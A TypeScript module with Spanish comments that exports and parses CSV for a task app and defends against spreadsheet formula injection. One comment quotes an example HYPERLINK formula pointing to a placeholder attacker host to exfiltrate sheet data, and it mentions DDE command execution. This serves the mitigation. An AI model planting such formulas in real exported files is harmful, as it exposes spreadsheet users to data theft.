// Exportación a CSV (F5 #4) — helpers genéricos, sin nada de tareas acá
// (eso vive en features/tasks/csv-export.ts): esta capa solo sabe
// convertir filas de texto a CSV y disparar la descarga.

// Inyección de fórmulas (auditoría de seguridad 2026-09-16, S3): Excel,
// LibreOffice Calc y Google Sheets evalúan como fórmula cualquier celda
// que EMPIECE con `=`, `+`, `-`, `@`, tab o CR — esté entrecomillada o
// no. RFC 4180 (más abajo) resuelve el *parseo*, no la *ejecución*: un
// título de tarea con `=HYPERLINK("https://atacante/…","Ver informe")`
// alcanza para exfiltrar la hoja al abrirla, o ejecutar comandos vía DDE
// con una sola confirmación. Mitigación estándar (OWASP): anteponer un
// apóstrofo — la convención nativa de Excel para "forzar texto", no se
// muestra como parte del valor al abrir el archivo. `parseCsv` reversa
// esto al reimportar (ver `stripFormulaGuard`) para no dejar el
// apóstrofo pegado para siempre en el viaje de ida y vuelta de esta
// misma app.
const FORMULA_TRIGGER = /^[=+\-@\t\r]/

// RFC 4180 §2.6: un campo con coma, comilla o salto de línea va entre
// comillas dobles, y las comillas internas se escapan duplicándolas. Sin
// esto, un título de tarea con una coma corre la columna entera.
function escapeCsvField(value: string): string {
  const guarded = FORMULA_TRIGGER.test(value) ? `'${value}` : value
  return /[",\r\n]/.test(guarded) ? '"' + guarded.replace(/"/g, '""') + '"' : guarded
}

// `\r\n`, no `\n` a secas: RFC 4180 lo pide así, y es lo que Excel espera
// para no mostrar el archivo entero en una sola celda al abrirlo.
export function rowsToCsv(rows: string[][]): string {
  return rows.map((row) => row.map(escapeCsvField).join(',')).join('\r\n')
}

// Parser RFC 4180 (Importaciones, F5 §Fase 10) — el reverso de
// `rowsToCsv`: mismo criterio de comillas dobles para campos con coma/
// salto de línea/comilla interna (escapada duplicándola). Máquina de
// estados simple en vez de un split ingenuo por comas: un split por ','
// rompe apenas un título de tarea trae una coma adentro, que es
// justamente el caso que `escapeCsvField` protege al exportar.
// Reversa el apóstrofo de protección de `escapeCsvField` (S3, ver
// arriba) — SOLO cuando el campo empieza con `'` seguido de uno de los
// caracteres que dispara la mitigación; un valor que de verdad empieza
// con un apóstrofo suelto (sin ese patrón detrás) queda intacto.
function stripFormulaGuard(field: string): string {
  return field[0] === "'" && FORMULA_TRIGGER.test(field.slice(1)) ? field.slice(1) : field
}

export function parseCsv(text: string): string[][] {
  // Sin esto, un .csv reexportado por esta misma app (downloadCsv agrega
  // el BOM) deja el BOM pegado al primer encabezado ("﻿Título") y
  // ninguna fila matchea ese header al mapear columnas.
  const clean = text.startsWith('﻿') ? text.slice(1) : text

  const rows: string[][] = []
  let row: string[] = []
  let field = ''
  let inQuotes = false

  for (let i = 0; i < clean.length; i++) {
    const char = clean[i]
    if (inQuotes) {
      if (char === '"') {
        if (clean[i + 1] === '"') {
          field += '"'
          i++
        } else {
          inQuotes = false
        }
      } else {
        field += char
      }
      continue
    }
    if (char === '"') {
      inQuotes = true
    } else if (char === ',') {
      row.push(stripFormulaGuard(field))
      field = ''
    } else if (char === '\r') {
      // Se ignora acá: el '\n' que sigue (o no) es lo que de verdad cierra
      // la fila, así que tanto '\r\n' como '\n' a secas terminan igual.
      continue
    } else if (char === '\n') {
      row.push(stripFormulaGuard(field))
      rows.push(row)
      row = []
      field = ''
    } else {
      field += char
    }
  }
  // Última fila sin salto de línea final.
  if (field.length > 0 || row.length > 0) {
    row.push(stripFormulaGuard(field))
    rows.push(row)
  }
  return rows
}

const UTF8_BOM = String.fromCharCode(0xfeff)

// Mismo patrón que `openAttachment` (src/features/attachments/api.ts):
// Blob -> Object URL -> <a download> disparado a mano -> revoke diferido
// (el navegador ya tomó la URL antes de los 10s, no hace falta mantenerla
// viva más que eso).
//
// UTF8_BOM al principio del contenido: sin él, Excel en Windows asume
// Latin-1 y corrompe tildes/eñes en el título de cualquier tarea — lo
// exige el propio Excel, no el estándar CSV.
export function downloadCsv(filename: string, content: string) {
  const blob = new Blob([UTF8_BOM + content], { type: 'text/csv;charset=utf-8;' })
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url
  a.download = filename
  document.body.appendChild(a)
  a.click()
  a.remove()
  setTimeout(() => URL.revokeObjectURL(url), 10_000)
}
